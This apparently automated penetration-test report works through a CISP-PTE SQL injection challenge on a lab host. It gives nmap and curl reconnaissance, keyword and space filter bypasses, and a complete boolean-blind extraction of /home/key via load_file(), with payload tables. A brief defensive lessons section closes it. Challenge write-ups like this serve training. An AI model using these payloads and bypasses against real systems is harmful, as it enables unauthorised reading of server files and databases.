# Attack Report — 8.140.206.93

**Generated:** 2026-07-19 13:23:08
**Target:** http://8.140.206.93:81
**Challenge:** CISP-PTE — SQL Injection (fu1.php)

## Target Summary

- **URL/IP:** http://8.140.206.93:81
- **Endpoint:** /vulnerabilities/fu1.php?id=1
- **Technologies detected:**
  - Apache 2.4.7 (Ubuntu)
  - PHP 5.5.9-1ubuntu4.14
  - MySQL (via mysql_connect, root user, no password — from exposed .git source)
  - HTML5, GBK/GB2312 charset
- **Open ports:** 81/tcp (HTTP only)
- **Exposed .git repository:** Yes — full git objects accessible via directory listing
- **Challenge goal (stated on index page):** Use SQL injection to read /home/key file

## Vulnerability Discovered

- **Type:** SQL Injection — boolean-based blind (also UNION-capable with filter bypass)
- **Location:** GET parameter `id` on `/vulnerabilities/fu1.php`
- **SQL template:** `select * from article where id= ('INPUT')`
- **How it was found:**
  1. The index page explicitly states this is a SQL injection challenge
  2. The page displays the executed SQL query, confirming injection points
  3. Manual testing with `1')#` confirmed the injection closes the `('` wrapper
  4. nmap discovered the exposed .git repository

### Filters Bypassed

The application applies two input filters:
1. **Keyword filter:** Removes `union` (case-insensitive, all occurrences) — bypassed with `uniunionon` (nested: filter removes inner "union", leaves outer "union")
2. **Space filter:** Removes all space characters — bypassed with `%09` (tab character)

### Comment Character

`--` (dash-dash-space) is ineffective because the space filter strips the required trailing space.
`#` (MySQL line comment) was used instead — it requires no trailing space.

## Exploitation Chain

### Step 1: Reconnaissance

```
nmap -T3 --max-retries 2 -sV -sC -p 81 8.140.206.93
```
- Revealed Apache 2.4.7 on Ubuntu, exposed .git repository
- Repository remotes point to https://github.com/fermayo/hello-world-lamp.git (base LAMP stack)

```
curl http://8.140.206.93:81/
```
- Index page states: "Use SQL injection to retrieve /home/key file"

```
curl http://8.140.206.93:81/vulnerabilities/fu1.php?id=1
```
- Displays the SQL query: `select * from article where id= ('1')`
- Reveals the template wraps input in `('...')`

### Step 2: Injection Point Analysis

```
curl "http://8.140.206.93:81/vulnerabilities/fu1.php?id=1')%23"
```
- `#` comment confirmed working — card shows article data (标题: SQL注入, 作者: admin)
- Confirmed the injection is valid MySQL syntax

**Filter discovery:**
- `union` keyword removed (case-insensitive) — discovered by seeing `union` disappear from displayed SQL
- Spaces removed — discovered by seeing injected spaces absent from displayed SQL
- `--` comment broken (space stripped) — card always empty with `--` comment

**Bypass development:**
- `uniunionon` -> filter removes "union" -> "union" remains ✓
- `%09` (tab) preserved in displayed SQL, not stripped ✓
- `%23` (#) works as MySQL comment, no space needed ✓

### Step 3: Boolean-Based Blind Extraction

**Oracle mechanism:**
- True: card displays article content (contains "admin" in author field)
- False: card shows empty fields

**Oracle payload format:**
```
id=1')%09and%09<CONDITION>%23
```

**Step 3a: Verify file readability**

Payload (URL-encoded):
```
http://8.140.206.93:81/vulnerabilities/fu1.php?id=1')%09and%09length(load_file('/home/key'))>0%23
```
Decoded SQL injection:
```sql
1')  and  length(load_file('/home/key'))>0#
```
Resulting SQL:
```sql
select * from article where id= ('1') and length(load_file('/home/key'))>0#')
```
Response: card shows article data (author: admin) -> TRUE
Conclusion: `/home/key` exists and is readable by MySQL.

**Step 3b: Extract file length via binary search**

| Test | Payload (URL-encoded, append to `{{base_url}}?`) | Card has "admin"? | Conclusion |
|------|---------------------------------------------------|-------------------|------------|
| len >= 250 | `id=1')%09and%09length(load_file('/home/key'))>=250%23` | FALSE | len < 250 |
| len >= 125 | `id=1')%09and%09length(load_file('/home/key'))>=125%23` | FALSE | len < 125 |
| len >= 62 | `id=1')%09and%09length(load_file('/home/key'))>=62%23` | FALSE | len < 62 |
| len >= 31 | `id=1')%09and%09length(load_file('/home/key'))>=31%23` | FALSE | len < 31 |
| len >= 15 | `id=1')%09and%09length(load_file('/home/key'))>=15%23` | FALSE | len < 15 |
| len >= 7 | `id=1')%09and%09length(load_file('/home/key'))>=7%23` | FALSE | len < 7 |
| len >= 3 | `id=1')%09and%09length(load_file('/home/key'))>=3%23` | TRUE | len >= 3 |
| len >= 5 | `id=1')%09and%09length(load_file('/home/key'))>=5%23` | FALSE | len < 5 |
| len >= 4 | `id=1')%09and%09length(load_file('/home/key'))>=4%23` | TRUE | len >= 4 |

Verification payload (exact match):
```
http://8.140.206.93:81/vulnerabilities/fu1.php?id=1')%09and%09length(load_file('/home/key'))=4%23
```
Decoded: `id=1') and length(load_file('/home/key'))=4#`
Result: TRUE — card shows "admin". Length confirmed = 4 bytes.

**Step 3c: Extract characters via binary search (ASCII range)**

Oracle payload template (URL-encoded):
```
http://8.140.206.93:81/vulnerabilities/fu1.php?id=1')%09and%09ascii(substr(load_file('/home/key'),POS,1))>=MID%23
```
Decoded: `id=1') and ascii(substr(load_file('/home/key'),POS,1))>=MID#`

**Position 1 binary search (target ASCII range 32-126):**

| Test | Payload (URL-encoded, append to `{{base_url}}?`) | "admin"? |
|------|---------------------------------------------------|----------|
| ASCII >= 79 | `id=1')%09and%09ascii(substr(load_file('/home/key'),1,1))>=79%23` | FALSE |
| ASCII >= 55 | `id=1')%09and%09ascii(substr(load_file('/home/key'),1,1))>=55%23` | FALSE |
| ASCII >= 43 | `id=1')%09and%09ascii(substr(load_file('/home/key'),1,1))>=43%23` | TRUE |
| ASCII >= 49 | `id=1')%09and%09ascii(substr(load_file('/home/key'),1,1))>=49%23` | TRUE |
| ASCII >= 52 | `id=1')%09and%09ascii(substr(load_file('/home/key'),1,1))>=52%23` | FALSE |
| ASCII >= 50 | `id=1')%09and%09ascii(substr(load_file('/home/key'),1,1))>=50%23` | FALSE |

Verification payload:
```
http://8.140.206.93:81/vulnerabilities/fu1.php?id=1')%09and%09ascii(substr(load_file('/home/key'),1,1))=49%23
```
Decoded: `id=1') and ascii(substr(load_file('/home/key'),1,1))=49#`
Result: TRUE -> Position 1 = ASCII 49 = `'1'`

**Position 2:**

Verification payload:
```
http://8.140.206.93:81/vulnerabilities/fu1.php?id=1')%09and%09ascii(substr(load_file('/home/key'),2,1))=50%23
```
Decoded: `id=1') and ascii(substr(load_file('/home/key'),2,1))=50#`
Result: TRUE -> Position 2 = ASCII 50 = `'2'`

**Position 3:**

Verification payload:
```
http://8.140.206.93:81/vulnerabilities/fu1.php?id=1')%09and%09ascii(substr(load_file('/home/key'),3,1))=51%23
```
Decoded: `id=1') and ascii(substr(load_file('/home/key'),3,1))=51#`
Result: TRUE -> Position 3 = ASCII 51 = `'3'`

**Position 4 (initial range 32-126 returned false — character is non-printable):**

```
http://8.140.206.93:81/vulnerabilities/fu1.php?id=1')%09and%09ascii(substr(load_file('/home/key'),4,1))=32%23
```
Decoded: `id=1') and ascii(substr(load_file('/home/key'),4,1))=32#`
Result: FALSE — position 4 is NOT space (ASCII 32)

**Step 3d: Find position 4 character (ASCII 0-31, non-printable range)**

| Test | Payload (URL-encoded, append to `{{base_url}}?`) | "admin"? |
|------|---------------------------------------------------|----------|
| ASCII = 0 | `id=1')%09and%09ascii(substr(load_file('/home/key'),4,1))=0%23` | FALSE |
| ASCII = 9 | `id=1')%09and%09ascii(substr(load_file('/home/key'),4,1))=9%23` | FALSE |
| ASCII = 13 | `id=1')%09and%09ascii(substr(load_file('/home/key'),4,1))=13%23` | FALSE |
| ASCII = 10 | `id=1')%09and%09ascii(substr(load_file('/home/key'),4,1))=10%23` | **TRUE** |

Verification payload:
```
http://8.140.206.93:81/vulnerabilities/fu1.php?id=1')%09and%09ascii(substr(load_file('/home/key'),4,1))=10%23
```
Decoded: `id=1') and ascii(substr(load_file('/home/key'),4,1))=10#`
Result: TRUE -> Position 4 = ASCII 10 = newline (`\n`)

**Extracted file content:** `123\n` (3 printable characters + trailing newline)
**Flag value:** `123`

### Step 4: Flag Extraction

The full content of `/home/key` is `123` (with trailing newline).

```
echo "123" > flags/flag.txt
```

## Flag(s) Captured

| Flag | Location | Method |
|------|----------|--------|
| `123` | /home/key (server file) | Boolean-based blind SQLi via load_file() |

## Lessons Learned

- **Root cause:** Unsanitized user input concatenated directly into SQL query. The `mysql_connect('localhost', 'root')` with no password allowed `load_file()` to read arbitrary files.
- **Weak filter:** The `union` and space filters were trivially bypassed (nested keyword bypass, tab character). Blacklist filtering is ineffective.
- **Defense:** Use parameterized queries (prepared statements). Never concatenate user input into SQL. Set a MySQL password. Use `open_basedir` to restrict file access. Disable `load_file()` for the MySQL user.
- **Dead ends:**
  - UNION SELECT injection: The SQL syntax appeared correct with all bypasses, but the card never displayed injected values. Root cause not fully determined — likely incorrect column count matching for `SELECT *` from the article table. The blind approach circumvented this entirely.
  - `--` comment: Spent significant time debugging why `--+` (URL-space) produced empty cards. The space filter strips the mandatory space after `--`, breaking the comment syntax.
  - .git source code: The exposed .git repo only contained the unmodified upstream files; the actual challenge files (fu1.php) were not committed.

## Files Saved

### recon/
- `service-scan.txt` — nmap service scan (Apache 2.4.7, exposed .git)
- `whatweb.txt` — technology fingerprinting
- `headers.txt` — HTTP response headers
- `fu1-source.html` — fu1.php?id=1 response (baseline)
- `index-source.html` — index page (challenge description)
- `index-php-source.txt` — original index.php from .git (mysql_connect root, no password)
- `git-config.txt` — .git/config (upstream repo URL)
- `git-exposure.txt` — .git/HEAD (ref: refs/heads/master)
- `sqli-manual.txt` — manual SQLi test outputs
- `sqli-bypass.txt` — union filter bypass tests
- `sqli-union-full.txt` — union SELECT full response
- `bool-true.html` / `bool-false.html` — boolean oracle verification
- `common-files.txt` — robots.txt (404), .git/config (200), .env (404)

### exploits/
- (Boolean-based blind extraction performed via shell scripts)

### flags/
- `flag.txt` — extracted flag: `123`
- `extracted-flag.txt` — raw extraction output

### logs/
- `extraction.log` — blind extraction process log

### Scripts
- `test_union.sh` — union injection test
- `brute_cols.sh` — column count brute force
- `test_bool.sh` — boolean oracle verification
- `check_file.sh` — load_file readability check
- `blind_extract.sh` — initial blind extraction attempt
- `blind_full.sh` — full blind extraction (length + characters)
- `check_pos4.sh` — position 4 non-printable character check
